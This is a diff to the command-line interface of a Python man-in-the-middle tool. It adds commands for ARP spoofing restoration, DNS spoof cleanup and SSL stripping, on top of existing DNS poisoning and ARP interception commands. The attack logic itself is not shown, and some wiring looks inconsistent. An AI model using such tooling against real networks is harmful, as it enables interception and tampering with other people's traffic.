@@ -108,7 +108,11 @@ class CLI:
         
         # reset ip forwarding
         os.system("sysctl -w net.ipv4.ip_forward={}".format(self.ip_forward))
+        self.remove_line()
         os.system("iptables -P FORWARD {}".format(self.ip_policy))
+        self.remove_line()
+        
+        exit()
 
     commands["quit"] = quit_
 
@@ -435,6 +439,16 @@ class CLI:
         
         target.arp_ensure_mitm(self.gateway.ip, self.gateway.mac, self.own_mac)
 
+    # restores the arp tables of the specified host to its pre-spoof state
+    def arp_restore(self, args):
+        
+        target = self.get_target(args)
+
+        if target:
+            target.arp_restore(self.own_mac, self.gateway.ip, self.gateway.ip)
+
+    commands[".arp_restore"]   = arp_restore
+
     # main dns command, calls subcommands
     def dns(self, args):
 
@@ -472,13 +486,23 @@ class CLI:
                 return
 
             # if no ip is specified, use own ip
-            # TODO eigen ip onafhankelijk opslaan van range
             if not ip_to_spoof:
                 ip_to_spoof = self.range_.split('/')[0]
 
             target.dns_add(url_to_spoof, ip_to_spoof)
 
     commands[".dns_add"] = dns_add
+
+    def dns_clean(self, args):
+
+        target = self.get_target(args)
+
+        # read: if specified target is found
+        if target:
+            
+            target.dns_clean()
+
+    commands[".dns_clean"] = dns_clean
 
     # set up and start dns poisoning attack against specified host
     def dns_start(self, args):
@@ -510,6 +534,57 @@ class CLI:
                 target.dns_stop()
 
     commands[".dns_stop"] = dns_stop
+
+    def dns_ensure(self, target):
+
+        target.dns_ensure(self.ip)
+
+    def ssl(self, args):
+
+        # obtain and call function specified by subcommand
+        # e.g. "dns poison foo" calls ".dns_poison(['foo'])"
+        try: 
+            self.commands[".ssl_" + args[0]](self, args[1:])
+    
+        # if unknown command is specified, "self.commands['.dns_' + args[0]]" will throw a KeyError
+        except KeyError as _:
+            print "E: Unknown command \"ssl {}\"".format(args[0])
+
+        # if no command is specified, "args[0]" will throw an IndexError
+        except IndexError as _:
+            print "E: No command specified"
+
+        self.prompt()
+
+    commands["ssl"] = ssl
+
+    # set up and start dns poisoning attack against specified host
+    def ssl_start(self, args):
+
+        target = self.get_target(args)
+
+        if target:
+            self.arp_ensure_mitm(target)
+
+            # start dns attack
+            target.ssl_start()
+
+    commands[".ssl_strip"] = ssl_start
+
+    def ssl_stop(self, args):
+        
+        if args[0] == "all":
+            for target in self.hosts:
+                target.ssl_stop()
+
+        else:
+
+            target = self.get_target(args)
+
+            if target:
+                target.ssl_stop()
+
+    commands[".ssl_stop"] = ssl_stop
 
 # create and start cli
 if __name__ == "__main__":
